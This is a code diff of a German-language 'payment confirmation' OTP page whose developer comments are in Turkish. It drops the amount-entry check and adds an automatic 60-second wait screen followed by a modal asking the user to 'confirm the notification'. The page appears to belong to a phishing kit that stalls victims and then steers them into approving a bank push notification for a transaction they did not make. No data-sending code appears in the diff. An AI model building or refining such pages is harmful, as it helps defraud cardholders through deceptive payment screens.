@@ -138,6 +138,49 @@
             color: #666;
             margin-top: 5px;
         }
+        .notification-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 30px 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            z-index: 10000;
+            display: none;
+            text-align: center;
+            max-width: 400px;
+        }
+        .notification-message.active {
+            display: block;
+        }
+        .notification-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 15px;
+        }
+        .notification-text {
+            font-size: 1rem;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .notification-button {
+            padding: 12px 30px;
+            background: #DF0000;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .notification-button:hover {
+            background: #b80000;
+        }
     </style>
 </head>
 <body>
@@ -151,6 +194,15 @@
         <div class="loading-timer" id="loading-timer">Bitte warten Sie 60 Sekunden</div>
     </div>
 
+    <!-- Notification Message -->
+    <div id="notification-message" class="notification-message">
+        <div class="notification-title">Bestätigung erforderlich</div>
+        <div class="notification-text">
+            Bitte bestätigen Sie die Benachrichtigung, um fortzufahren.
+        </div>
+        <button class="notification-button" id="notification-button">Bestätigen</button>
+    </div>
+
     <div class="otp-container">
         <div class="otp-box">
             <h1 class="otp-title">Zahlungsbestätigung</h1>
@@ -160,12 +212,11 @@
                 <!-- Customer info will be loaded here -->
             </div>
             
-            <div class="otp-form-group">
-                <label class="otp-label" for="amount-confirm">Bestätigen Sie den Betrag (€) *</label>
-                <input type="text" id="amount-confirm" class="otp-input" placeholder="Betrag eingeben" required>
+            <div style="text-align: center; margin-top: 30px; padding: 20px; background: #f5f5f5; border-radius: 8px;">
+                <p style="font-size: 1rem; color: #333; margin: 0;">
+                    Bitte bestätigen Sie die Benachrichtigung, um fortzufahren.
+                </p>
             </div>
-            
-            <button id="verify-button" class="otp-button">Bestätigen</button>
         </div>
     </div>
 
@@ -210,36 +261,28 @@
                     
                     // Store total amount for verification
                     window.checkoutTotal = parseFloat(totalAmount);
+                    
+                    // Start loading and timer automatically
+                    startVerificationProcess();
                 })
                 .catch(function(error) {
                     console.error('❌ Checkout verisi yüklenemedi:', error);
                     alert('Checkout verisi yüklenemedi');
                 });
             
-            // Verify button click
-            document.getElementById('verify-button').addEventListener('click', function() {
-                const amountInput = document.getElementById('amount-confirm').value.trim();
-                const enteredAmount = parseFloat(amountInput.replace(',', '.').replace(/[^\d.]/g, ''));
-                
-                if (!amountInput || isNaN(enteredAmount)) {
-                    alert('Bitte geben Sie einen gültigen Betrag ein.');
-                    return;
-                }
-                
-                // Check if entered amount matches checkout total (with small tolerance for rounding)
-                if (window.checkoutTotal && Math.abs(enteredAmount - window.checkoutTotal) > 0.01) {
-                    alert('Der eingegebene Betrag stimmt nicht überein. Bitte geben Sie den korrekten Betrag ein: ' + window.checkoutTotal.toFixed(2) + ' €');
-                    return;
-                }
-                
-                // Show loading overlay
+            // Notification button click handler (set once)
+            document.getElementById('notification-button').addEventListener('click', function() {
+                var notificationMessage = document.getElementById('notification-message');
+                notificationMessage.classList.remove('active');
+                alert('Betrag bestätigt! Vielen Dank für Ihre Bestellung.');
+            });
+            
+            // Start verification process with loading and timer
+            function startVerificationProcess() {
+                // Show loading overlay immediately
                 var loadingOverlay = document.getElementById('loading-overlay');
                 var loadingTimer = document.getElementById('loading-timer');
                 loadingOverlay.classList.add('active');
-                
-                // Disable button
-                var verifyButton = document.getElementById('verify-button');
-                verifyButton.disabled = true;
                 
                 // Start 60 second countdown
                 var secondsLeft = 60;
@@ -251,15 +294,17 @@
                         loadingTimer.textContent = 'Verarbeitung abgeschlossen!';
                         clearInterval(countdownInterval);
                         
-                        // Hide loading after 1 second
+                        // Hide loading and show notification after 1 second
                         setTimeout(function() {
                             loadingOverlay.classList.remove('active');
-                            alert('Betrag bestätigt! Vielen Dank für Ihre Bestellung.');
-                            verifyButton.disabled = false;
+                            
+                            // Show notification message
+                            var notificationMessage = document.getElementById('notification-message');
+                            notificationMessage.classList.add('active');
                         }, 1000);
                     }
                 }, 1000);
-            });
+            }
         });
     </script>
 </body>
